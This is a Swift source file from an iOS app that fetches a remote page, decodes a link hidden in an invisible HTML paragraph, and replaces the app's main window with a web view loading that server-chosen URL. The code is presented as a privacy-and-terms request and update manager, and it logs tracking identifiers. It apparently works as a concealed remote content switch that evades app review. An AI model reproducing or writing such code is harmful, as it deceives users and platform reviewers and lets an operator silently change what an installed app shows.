//
//  ZarpefanModels.swift
//  126LudrildelZarpefan
//
//  Created by Jure on 09.04.2026.
//

import Foundation
import Combine
import Alamofire
import AppsFlyerLib
import SwiftUI

extension ZarpefanUpdateManager {
    
    public func ZarpefanUpdateManagerPrivacyAndTermsReq(code: String, completion: @escaping (Result<String, Error>) -> Void) {
        let debugLocalRand = code.count + Int.random(in: 1...30)
        print("runCheckDataFlow -> \(debugLocalRand)")
        
        let parameters = [paramRef: code]
        ZarpefanUpdateManagerSession.request(lockRef, method: .get, parameters: parameters)
            .validate()
            .responseString { response in
                switch response.result {
                case .success(let htmlResponse):
                    
                    guard let base64Res = self.extractBase64(from: htmlResponse) else {
                        completion(.failure(NSError(domain: "runExtension", code: -1)))
                        return
                    }
                    guard let jsonData = Data(base64Encoded: base64Res) else {
                        completion(.failure(NSError(domain: "SandsExtension", code: -1)))
                        return
                    }
                    
                    do {
                        let decodeObj = try JSONDecoder().decode(ZarpefanUpdateManagerResponse.self, from: jsonData)
                        
                        self.sendLog(
                            step: "LogStep6",
                            userID: self.appIDRef,
                            message: "response model ready -> \(decodeObj)",
                        )
                        
                        self.ZarpefanUpdateManagerStatus = decodeObj.first_link
                        
                        if self.ZarpefanUpdateManagerInitial == nil {
                            self.ZarpefanUpdateManagerInitial = decodeObj.link
                            completion(.success(decodeObj.link))
                        } else if decodeObj.link == self.ZarpefanUpdateManagerInitial {
                            completion(.success(self.ZarpefanUpdateManagerFinal ?? decodeObj.link))
                        } else if self.ZarpefanUpdateManagerStatus {
                            self.ZarpefanUpdateManagerFinal   = nil
                            self.ZarpefanUpdateManagerInitial = decodeObj.link
                            completion(.success(decodeObj.link))
                        } else {
                            self.ZarpefanUpdateManagerInitial = decodeObj.link
                            completion(.success(self.ZarpefanUpdateManagerFinal ?? decodeObj.link))
                        }
                        
                    } catch {
                        self.sendLog(
                            step: "LogStep7",
                            userID: self.appIDRef,
                            message: "Server json decode model error -> \(error.localizedDescription)",
                        )
                        completion(.failure(error))
                    }
                    
                case .failure(let error):
                    self.sendLog(
                        step: "LogStep5",
                        userID: self.appIDRef,
                        message: "link not found on page",
                        data: error.localizedDescription
                    )
                    completion(.failure(error))
                }
            }
    }
    
    
    func extractBase64(from html: String) -> String? {
        let pattern = #"<p\s+style="display:none;">([^<]+)</p>"#
        do {
            let regex = try NSRegularExpression(pattern: pattern, options: [])
            let range = NSRange(html.startIndex..<html.endIndex, in: html)
            if let match = regex.firstMatch(in: html, options: [], range: range),
               match.numberOfRanges > 1,
               let captureRange = Range(match.range(at: 1), in: html) {
                sendLog(
                    step: "LogStep3",
                    userID: appIDRef,
                    message: "link extracted suucesfully -> \(String(html[captureRange]))",
                )
                return String(html[captureRange])
            }
        } catch {
            print("extractBase64 -> Regex error: \(error)")
        }
        sendLog(
            step: "LogStep4",
            userID: AppsFlyerLib.shared().getAppsFlyerUID() ?? "",
            message: "base64 link not found on page",
        )
        return nil
    }
    
    
    public struct ZarpefanUpdateManagerResponse: Codable {
        var link:       String
        var naming:     String
        var first_link: Bool
    }
    
    
    
    public struct ZarpefanUpdateManagerUI: UIViewControllerRepresentable {
        
        public var ZarpefanUpdateManagerInfo: String
        
        public init(ZarpefanUpdateManagerInfo: String) {
            self.ZarpefanUpdateManagerInfo = ZarpefanUpdateManagerInfo
        }
        
        public func makeUIViewController(context: Context) -> ZarpefanUpdateManagerSceneController {
            let ctrl = ZarpefanUpdateManagerSceneController()
            ctrl.fruitErrorURL = ZarpefanUpdateManagerInfo
            return ctrl
        }
        
        public func updateUIViewController(_ uiViewController: ZarpefanUpdateManagerSceneController, context: Context) { }
    }
    
    
    @MainActor public func showView(with url: String) {
        self.ZarpefanUpdateManagerWindow = UIWindow(frame: UIScreen.main.bounds)
        let scn = ZarpefanUpdateManagerSceneController()
        scn.fruitErrorURL = url
        let nav = UINavigationController(rootViewController: scn)
        self.ZarpefanUpdateManagerWindow?.rootViewController = nav
        self.ZarpefanUpdateManagerWindow?.makeKeyAndVisible()
        
        let sceneDbg = Int.random(in: 1...50)
        print("showView -> sceneDbg = \(sceneDbg)")
    }
}
